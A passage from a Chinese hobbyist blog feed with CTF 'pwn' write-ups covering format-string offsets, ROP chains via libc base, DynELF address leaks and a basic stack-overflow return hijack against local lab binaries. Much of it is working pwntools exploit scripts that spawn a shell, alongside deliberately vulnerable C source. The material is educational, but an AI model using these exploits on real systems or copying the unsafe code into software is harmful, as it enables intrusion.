1024);</div><div class="line">        <span class="built_in">read</span>(0, a, 1024);</div><div class="line">        <span class="built_in">printf</span>(a);</div><div class="line">        fflush(stdout);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>FmtStr函数利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">    p = process(<span class="string">'./1'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="built_in">return</span> p.recv()</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="built_in">print</span> autofmt.offset</div></pre></td></tr></table></figure></p><p>结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># python 1.py </span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4859</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4861</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4863</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4865</div><div class="line">[*] Found format string offset: 4</div><div class="line">4</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4865)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4863)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4861)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4859)</div></pre></td></tr></table></figure></p><h3 id="fmtstr-payload函数"><a href="#fmtstr-payload函数" class="headerlink" title="fmtstr_payload函数"></a>fmtstr_payload函数</h3><p>fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。<br>fmtstr_payload有两个参数<br>第一个参数是int，用于表示取参数的偏移个数offset=7<br>第二个参数是字典，字典的意义是往key的地址，写入value的值<br><code>fmtstr_payload(7, {printf_got: system_add})</code><br>这个函数调用会往printf_got中写入system_add</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FmtStr的利用&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN2_me</title>
    <link href="http://yoursite.com/2017/10/07/pwn2_me/"/>
    <id>http://yoursite.com/2017/10/07/pwn2_me/</id>
    <published>2017-10-07T01:10:49.046Z</published>
    <updated>2017-10-08T04:01:40.617Z</updated>
    
    <content type="html"><![CDATA[<p>记录每天的进步，只有努力不会背叛自己！每天学习一点PWN</p><h1 id="PWN从开始到开始–通过libc的base"><a href="#PWN从开始到开始–通过libc的base" class="headerlink" title="PWN从开始到开始–通过libc的base"></a>PWN从开始到开始–通过libc的base</h1><a id="more"></a><h2 id="1、程序"><a href="#1、程序" class="headerlink" title="1、程序"></a>1、程序</h2><p>拿到题目<br>链接：<a href="http://pan.baidu.com/s/1pKTjqgr" target="_blank" rel="external">http://pan.baidu.com/s/1pKTjqgr</a> 密码：dhw5<br><code>checksec pwn2</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">    FORTIFY:  Enabled</div><div class="line">`</div></pre></td></tr></table></figure></p><p>程序可以知道是６４位的，它的传参优先由寄存器完成。<br>接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</p><h2 id="2、分析程序"><a href="#2、分析程序" class="headerlink" title="2、分析程序"></a>2、分析程序</h2><p>我们去尝试运行，摸清了基本上的程序的功能。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn2<span class="comment"># ./pwn2 </span></div><div class="line"></div><div class="line">Welcome to an easy Return Oriented Programming challenge...</div><div class="line">Menu:</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 1</div><div class="line">libc.so.6: 0x00007FB8DF81A9B0</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 2</div><div class="line">Enter symbol: system</div><div class="line">Symbol system: 0x00007FB8DF095450</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: 3</div><div class="line">Enter bytes to send (max 1024): 3</div><div class="line">asd</div><div class="line">1) Get libc address</div><div class="line">2) Get address of a libc <span class="keyword">function</span></div><div class="line">3) Nom nom r0p buffer to stack</div><div class="line">4) Exit</div><div class="line">: Bad choice.</div></pre></td></tr></table></figure></p><p>功能1，可以获得libc的基址<br>功能2，可以获得函数的地址<br>功能3，输入的地方，感觉这个地方可能存在漏洞。</p><p>紧接着，我们可以用IDA 分析程序了。<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fk9f5lnogdj30gb0ixjre.jpg" alt=""><br>发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</p><p>void memcpy(voiddest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。savedregs是一个IDA关键字我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fk9f8tb1ldj30g9039dfm.jpg" alt=""><br>buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：<br>1、找到system的地址<br>2、找到”/bin/sh”地址，找不到就找个bss地址，将”/bin/sh”传入<br>3、找个gadgets像pop rdi,ret<br>完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。</p><h2 id="3、找"><a href="#3、找" class="headerlink" title="3、找"></a>3、找</h2><p>这个ROPgadget安装参考:<br><a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">https://github.com/JonathanSalwan/ROPgadget</a><br>找到本地的gadgets<br><code>ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only &quot;pop|ret&quot;|grep rdi</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">0x000000000002079b : pop rdi ; pop rbp ; ret</div><div class="line">0x000000000001fc3a : pop rdi ; ret</div><div class="line">0x0000000000025312 : pop rdi ; ret 0x13</div></pre></td></tr></table></figure></p><p>参看目标libc版本：ldd<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">linux-vdso.so.1 (0x00007ffecd990000)</div><div class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f427bb9d000)</div><div class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f427b7fe000)</div><div class="line">/lib64/ld-linux-x86-64.so.2 (0x0000561313850000)</div></pre></td></tr></table></figure></p><p>找到本地的/bin/sh<br><code>strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep &quot;/bin/sh&quot;</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn2<span class="comment"># strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"</span></div><div class="line"> 161999 /bin/sh</div></pre></td></tr></table></figure></p><p>可以知道”/bin/sh”偏移是0x161999<br>至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</p><h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp:"></a>4、exp:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def get_libc_func_addr(p, <span class="keyword">function</span>):</div><div class="line">  p.send(<span class="string">"2\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"Enter symbol: "</span>)</div><div class="line">  p.send(<span class="keyword">function</span>+<span class="string">"\n"</span>)</div><div class="line">  msg = p.recvuntil(<span class="string">"4) Exit\n: "</span>)</div><div class="line">  offset = msg.find(<span class="string">":"</span>)</div><div class="line">  offset2 = msg.find(<span class="string">"\n"</span>)</div><div class="line">  addr = msg[offset+2: offset2]</div><div class="line">  <span class="built_in">return</span> long(addr, 16)</div><div class="line"></div><div class="line">def send(p,payload):</div><div class="line">  p.sendline(<span class="string">"3"</span>)</div><div class="line">  p.recv(1024)</div><div class="line">  p.send(<span class="string">"%d\n"</span>%(len(payload)+1))</div><div class="line">  p.sendline(payload)</div><div class="line">  p.sendline(<span class="string">"4"</span>)</div><div class="line">  <span class="built_in">return</span></div><div class="line"></div><div class="line">p=process(<span class="string">"./pwn2"</span>)  </div><div class="line"><span class="comment">#p=remote("127.0.0.1",4001)</span></div><div class="line">so = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</div><div class="line"><span class="comment">#so=ELF('libc.so.6')</span></div><div class="line"></div><div class="line">system_addr=get_libc_func_addr(p,<span class="string">"system"</span>)</div><div class="line"><span class="built_in">print</span> hex(system_addr)</div><div class="line"></div><div class="line">system_offset=0x780560</div><div class="line">system_offset=so.symbols[<span class="string">'system'</span>]</div><div class="line">base=system_addr-system_offset</div><div class="line"><span class="built_in">print</span> hex(base)</div><div class="line"></div><div class="line">pop_r_offset=0x1fc3a</div><div class="line">pop_r_addr=base+pop_r_offset</div><div class="line"></div><div class="line">sh_offset=0x161999</div><div class="line">sh_addr=base+sh_offset</div><div class="line"></div><div class="line">payload=<span class="string">'a'</span>*8+p64(pop_r_addr)+p64(sh_addr)+p64(system_addr)</div><div class="line"></div><div class="line">send(p,payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>这里记录一下我走过的坑，<br>不知道libc.so.6的地址打印出来是干什么的，开始我认为是libc_base,但是它的值比打印出来的system值大，这就很奇怪，因为：<br>system_offset = so.symbols[‘system’]<br>systemAddr -  system_offset = libc_base<br>writeAddr -so.symbols[‘write’] = libc_base</p><p>所以不知道它的作用是什么，但这道题，没有给libc.so.6,据说是可以查看版本的，这里我就偷懒的，因为和上一道题是在同一台机器上的，那肯定用同一个libc库了，直接拿来用</p><h3 id="最后，文学还是很重要的，借助诗圣两句提高文学素养"><a href="#最后，文学还是很重要的，借助诗圣两句提高文学素养" class="headerlink" title="最后，文学还是很重要的，借助诗圣两句提高文学素养"></a>最后，文学还是很重要的，借助诗圣两句提高文学素养</h3><p>绝代有佳人，幽居在空谷。<br>但见新人笑，那闻旧人哭。<br>——佳人</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录每天的进步，只有努力不会背叛自己！每天学习一点PWN&lt;/p&gt;
&lt;h1 id=&quot;PWN从开始到开始–通过libc的base&quot;&gt;&lt;a href=&quot;#PWN从开始到开始–通过libc的base&quot; class=&quot;headerlink&quot; title=&quot;PWN从开始到开始–通过libc的base&quot;&gt;&lt;/a&gt;PWN从开始到开始–通过libc的base&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN——泄露函数地址，获取libc</title>
    <link href="http://yoursite.com/2017/10/06/pwn5/"/>
    <id>http://yoursite.com/2017/10/06/pwn5/</id>
    <published>2017-10-06T05:26:11.963Z</published>
    <updated>2017-11-09T11:49:41.476Z</updated>
    
    <content type="html"><![CDATA[<p>DynELF泄露函数地址<br><a id="more"></a></p><h2 id="1、源码"><a href="#1、源码" class="headerlink" title="1、源码"></a>1、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line">void <span class="function"><span class="title">vulnerable_function</span></span>() &#123;</div><div class="line">char buf[128];</div><div class="line"><span class="built_in">read</span>(STDIN_FILENO, buf, 256);</div><div class="line">&#125;</div><div class="line">int main(int argc, char** argv) &#123;</div><div class="line">vulnerable_function();</div><div class="line">write(STDOUT_FILENO, <span class="string">"Hello, World\\n"</span>, 13);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn3 pwn3.c</code></p><h2 id="2、步骤"><a href="#2、步骤" class="headerlink" title="2、步骤"></a>2、步骤</h2><p>没有system函数和libc.so<br>1、找到system函数<br>2、将\bin\sh写入bss段<br>3、利用gadgets构造system(‘\bin\sh’),得到shell</p><h2 id="3、漏洞原理，利用pwntools中的DynELF模块来寻找system-addr"><a href="#3、漏洞原理，利用pwntools中的DynELF模块来寻找system-addr" class="headerlink" title="3、漏洞原理，利用pwntools中的DynELF模块来寻找system_addr"></a>3、漏洞原理，利用pwntools中的DynELF模块来寻找system_addr</h2><p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。<br>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./pwn3’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。这里的leak函数是这样的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def leak(address):</div><div class="line">    payload1=<span class="string">'a'</span>*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(4)</div><div class="line">    <span class="built_in">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data or <span class="string">''</span>).encode(<span class="string">'hex'</span>))</div><div class="line">    <span class="built_in">return</span> data</div></pre></td></tr></table></figure></p><p>write(fb,addr,len)对应<br>write(p32(1),p32(address),p32(4))<br>p32(write_plt):这是原返回地址，改为write_plt的地址，p32(main)是write_plt的返回地址 ，p32(1)是write_plt的参数1代表读，0代表写，p32(address)是write_plt要读的地址，p32(4)是write_plt要读的字节数</p><p>这样就会循环读取函数地址 ,读取地址<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn3'</span>))</div><div class="line"></div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</div></pre></td></tr></table></figure></p><p>结果<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[+] Resolving <span class="string">'system'</span> <span class="keyword">in</span> <span class="string">'libc.so'</span>: 0xf7ffd920</div><div class="line">0x8049f14 =&gt; 01000000</div><div class="line">0x8049f1c =&gt; 0c000000</div><div class="line">0x8049f24 =&gt; 0d000000</div><div class="line">0xf7df1000 =&gt; 7f454c46</div><div class="line">0xf7fd2860 =&gt; b03dfaf7</div><div class="line">0xf7df1004 =&gt; 01010103</div><div class="line">0xf7fa3db0 =&gt; 01000000</div><div class="line">0xf7fa3db8 =&gt; 0e000000</div><div class="line"><span class="string">''</span><span class="string">'</span></div><div class="line"><span class="string">0xf7df2390 =&gt; b5050000</span></div><div class="line"><span class="string">0xf7df4040 =&gt; 8ae4ee1c</span></div><div class="line"><span class="string">0xf7dfaa88 =&gt; 70310000</span></div><div class="line"><span class="string">0xf7e017d8 =&gt; 73797374</span></div><div class="line"><span class="string">0xf7e017dc =&gt; 656d0074</span></div><div class="line"><span class="string">0xf7dfaa8c =&gt; 30ab0300</span></div><div class="line"><span class="string">system_addr=0xf7e2bb30</span></div></pre></td></tr></table></figure></p><p>这里我们已经得到system_addr了</p><h2 id="4、构造payload3-得到shell"><a href="#4、构造payload3-得到shell" class="headerlink" title="4、构造payload3,得到shell"></a>4、构造payload3,得到shell</h2><p>找gadgets利用<br><code>objdump -d ./pwn3|egrep &quot;pop|ret&quot;</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">80482e9:5b                   pop    %ebx</div><div class="line">80482ea:c3                   ret    </div><div class="line">8048342:5e                   pop    %esi</div><div class="line">8048373:c3                   ret    </div><div class="line">80483a9:f3 c3                repz ret </div><div class="line">80483e3:f3 c3                repz ret </div><div class="line">804840c:f3 c3                repz ret </div><div class="line">804846f:c3                   ret    </div><div class="line">80484ad:59                   pop    %ecx</div><div class="line">80484ae:5b                   pop    %ebx</div><div class="line">80484af:5d                   pop    %ebp</div><div class="line">80484b3:c3                   ret    </div><div class="line">80484b7:c3                   ret    </div><div class="line">8048518:5b                   pop    %ebx</div><div class="line">8048519:5e                   pop    %esi</div><div class="line">804851a:5f                   pop    %edi</div><div class="line">804851b:5d                   pop    %ebp</div><div class="line">804851c:c3                   ret    </div><div class="line">8048520:f3 c3                repz ret </div><div class="line">8048536:5b                   pop    %ebx</div><div class="line">8048537:c3                   ret</div></pre></td></tr></table></figure></p><p>因为我们需要pop pop pop ret,这里我选择pppr=0x80484ad<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload2 =<span class="string">'a'</span>*140+p32(plt_read)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) </div><div class="line">payload2 += p32(system_addr)+p32(1)+p32(bss_addr)</div></pre></td></tr></table></figure></p><h2 id="5、整个攻击过程如下：首先通过DynELF获取到system-的地址后，我们又通过read将“-bin-sh”写入到-bss段上，最后再调用system（-bss），执行“-bin-sh”。最终的exp如下"><a href="#5、整个攻击过程如下：首先通过DynELF获取到system-的地址后，我们又通过read将“-bin-sh”写入到-bss段上，最后再调用system（-bss），执行“-bin-sh”。最终的exp如下" class="headerlink" title="5、整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:"></a>5、整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到.bss段上，最后再调用system（.bss），执行“/bin/sh”。最终的exp如下:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">read_plt =  elf.plt[<span class="string">'read'</span>]</div><div class="line">write_plt=elf.plt[<span class="string">'write'</span>]</div><div class="line">main=elf.symbols[<span class="string">'main'</span>]</div><div class="line">pppr=0x8048519</div><div class="line">bss_addr= elf.bss()</div><div class="line"><span class="built_in">print</span> hex(bss_addr)</div><div class="line"></div><div class="line">def leak(address):</div><div class="line">    payload1=<span class="string">'a'</span>*140+p32(write_plt)+p32(main)+p32(1)+p32(address)+p32(4)</div><div class="line">    p.send(payload1)</div><div class="line">    data = p.recv(4)</div><div class="line">    <span class="comment">#print "%#x =&gt; %s" % (address, (data or '').encode('hex'))</span></div><div class="line">    <span class="built_in">return</span> data</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">'./pwn3'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</div><div class="line"><span class="built_in">print</span> <span class="string">"system_addr="</span> + hex(system_addr)</div><div class="line"><span class="comment">#gdb.attach(p)</span></div><div class="line"></div><div class="line">payload2 =<span class="string">'a'</span>*140+p32(read_plt)+p32(pppr)+p32(0)+p32(bss_addr)+p32(8) </div><div class="line">payload2 += p32(system_addr)+p32(main)+p32(bss_addr)</div><div class="line">p.send(payload2)</div><div class="line">p.send(<span class="string">"/bin/sh\0"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>记录一下自己走过的坑，不知道找gadgets利用的时候pppr=0x80484ad,程序就会莫名的中断 ，<br>调试发现，当跳到0x80484ad这个地址时，程序就退出了。换个pppr=0x8048519，运行成功。<br>可能是 那个gadgets有问题，不知道了，不过可以多换几个试试</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;DynELF泄露函数地址&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN_栈溢出——控制流劫持</title>
    <link href="http://yoursite.com/2017/10/04/pwn1/"/>
    <id>http://yoursite.com/2017/10/04/pwn1/</id>
    <published>2017-10-04T07:46:24.925Z</published>
    <updated>2017-11-09T11:44:47.238Z</updated>
    
    <content type="html"><![CDATA[<p>第一次拿到shell,感觉真好<br><a id="more"></a></p><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>通过覆盖返回地址，让程序执行我们想要执行的位置（任意地址）,包括我们构造的shellcode，从而得到shell<br>换个姿势理解： <a href="https://esebanana.github.io/2017/09/14/window-hexo/" target="_blank" rel="external">https://esebanana.github.io/2017/09/14/window-hexo/</a></p><h2 id="2、源码福利"><a href="#2、源码福利" class="headerlink" title="2、源码福利"></a>2、源码福利</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line">void <span class="function"><span class="title">success</span></span>() &#123;</div><div class="line">puts(<span class="string">"You Hava already controlled it."</span>);</div><div class="line">system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">vulnerable</span></span>() &#123;</div><div class="line">char s[12];</div><div class="line">gets(s);</div><div class="line">puts(s);</div><div class="line"><span class="built_in">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">vulnerable();</div><div class="line"><span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="3、命令编译程序生成stack1-exe文件"><a href="#3、命令编译程序生成stack1-exe文件" class="headerlink" title="3、命令编译程序生成stack1.exe文件"></a>3、命令编译程序生成stack1.exe文件</h2><p><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c</code><br>-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX</p><h2 id="4、分析"><a href="#4、分析" class="headerlink" title="4、分析"></a>4、分析</h2><p>使用ida打开，发现如下:<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0dswpxmj30a4049q2q.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0gjcua3j30fe05xq41.jpg" alt=""></p><p>这里就可以覆盖返回地址构造溢出</p><h2 id="5、写exp"><a href="#5、写exp" class="headerlink" title="5、写exp"></a>5、写exp</h2><p>这里可以安装pwntools，这是一个很好用的工具<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>调试可以用gdb,可以安装插件peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code></p><p>exp:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*24 + p32(0x804846B)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次拿到shell,感觉真好&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PWN_x86中的ROP利用</title>
    <link href="http://yoursite.com/2017/10/04/pwn4/"/>
    <id>http://yoursite.com/2017/10/04/pwn4/</id>
    <published>2017-10-04T07:14:51.648Z</published>
    <updated>2017-11-09T11:48:16.679Z</updated>
    
    <content type="html"><![CDATA[<p>啥是rop?<br><a id="more"></a></p><h2 id="1、CTF中的ROP"><a href="#1、CTF中的ROP" class="headerlink" title="1、CTF中的ROP"></a>1、CTF中的ROP</h2><p>顾名思义ROP，就是面向返回语句的编程方法，它借用libc代码段里面的多个retq前的一段指令拼凑成一段有效的逻辑，从而达到攻击的目标。</p><h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line">void f()</div><div class="line">&#123;</div><div class="line">     system(<span class="string">"no_shell_QQ"</span>);</div><div class="line">&#125;</div><div class="line">void secure(void)</div><div class="line">&#123;</div><div class="line">    char buf1[100];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"What do you think ?\n"</span>);</div><div class="line">    gets(buf1);</div><div class="line">&#125;</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    secure();</div><div class="line">    <span class="built_in">return</span> 